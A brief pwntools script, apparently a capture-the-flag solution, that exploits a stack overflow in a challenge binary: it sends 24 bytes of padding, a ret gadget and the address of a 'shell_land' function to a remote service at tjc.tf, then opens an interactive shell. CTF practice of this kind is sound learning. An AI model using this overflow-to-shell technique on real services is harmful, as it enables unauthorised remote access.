from pwn import *

binfile = "./challp"
context.binary = binfile
elf = ELF(binfile)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
print(ret)

shell_land = elf.symbols['shell_land']
print(shell_land)
HOST='tjc.tf'
PORT=31680

# conn = process(binfile)
conn = remote(HOST, PORT)
conn.recvuntil(b'Where am I going today?\n')

# padding + ret(8byte, allignment) + fun(=/bin/sh)
payload = b'A' * 24 + p64(ret) + p64(shell_land)

conn.sendline(payload)
conn.interactive()
